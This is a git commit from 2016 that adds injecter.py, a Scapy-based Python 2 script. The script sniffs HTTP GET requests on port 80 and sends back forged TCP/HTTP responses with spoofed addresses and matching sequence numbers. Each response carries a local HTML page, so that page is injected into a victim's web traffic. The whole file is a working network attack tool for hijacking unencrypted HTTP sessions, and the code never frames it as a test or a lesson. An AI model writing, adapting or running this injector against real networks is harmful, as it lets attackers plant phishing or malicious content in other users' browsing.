addfe0d6a82aa225df5778e116321c63477c76e6
mets634 <mets634@gmail.com>
2016-10-18 11:44:52 +0300

    Add files via upload

---
+++ injecter.py
@@ -0,0 +1,43 @@
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # remove scapy warnings
+
+from scapy.all import *
+conf.verb = 0 # turn off scapy messages
+
+path = 'my_page.html'
+page = open(path, 'r') # open file containing html
+html = page.read() # get html
+
+
+def start(times=10):
+    print "Listening for http GET requests..."
+    
+    sniff(prn=inject,
+          filter='tcp port 80', # http
+          lfilter=lambda p: 'GET' in str(p), # is a GET request
+          count=times
+    ) 
+
+def inject(p): # got packet, inject my html
+    response = forge_response(p)
+    print 'Spoofed Response: ' + str(response[IP].src) + '->' + str(response[IP].dst)
+    fin_ack = sendp(response) # send spoofed response, waiting for victim's fin-ack
+            
+def forge_response(p):
+    ether = Ether(src=p[Ether].dst, dst=p[Ether].src) # switch ethernet direction
+    ip = IP(src=p[IP].dst, dst=p[IP].src) # switch direction of ip address
+    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + 1, flags="AP") # switch direction of ports and send FIN
+    
+    # create http response
+    response = "HTTP /1.1 200 OK\n"
+    response += "Server: MyServer\n"
+    response += "Content-Type: text/html\n"
+    response += "Content-Length: " + str(len(html)) + "\n"
+    response += "Connection: close"
+    response += "\n\n"
+    response += html
+    
+    my_packet = ether / ip / tcp / response # forge response packet with my html in it
+    return my_packet
+    
+start()
